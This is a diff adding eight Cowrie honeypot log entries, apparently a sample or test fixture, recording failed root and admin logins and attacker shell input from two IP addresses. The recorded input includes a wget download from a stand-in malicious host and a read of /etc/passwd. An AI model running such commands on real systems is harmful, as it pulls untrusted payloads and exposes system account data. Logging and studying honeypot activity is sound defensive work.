@@ -1,0 +1,8 @@
+{"eventid":"cowrie.login.failed","src_ip":"185.220.101.5","timestamp":"2026-09-02T20:10:00Z","username":"root"}
+{"eventid":"cowrie.login.failed","src_ip":"185.220.101.5","timestamp":"2026-09-02T20:10:05Z","username":"admin"}
+{"eventid":"cowrie.command.input","src_ip":"185.220.101.5","timestamp":"2026-09-02T20:10:15Z","input":"whoami"}
+{"eventid":"cowrie.command.input","src_ip":"185.220.101.5","timestamp":"2026-09-02T20:10:20Z","input":"ls"}
+{"eventid":"cowrie.command.input","src_ip":"185.220.101.5","timestamp":"2026-09-02T20:10:30Z","input":"wget http://malicious.example/file"}
+{"eventid":"cowrie.login.failed","src_ip":"103.27.186.12","timestamp":"2026-09-02T20:15:00Z","username":"root"}
+{"eventid":"cowrie.command.input","src_ip":"103.27.186.12","timestamp":"2026-09-02T20:15:10Z","input":"pwd"}
+{"eventid":"cowrie.command.input","src_ip":"103.27.186.12","timestamp":"2026-09-02T20:15:20Z","input":"cat /etc/passwd"}
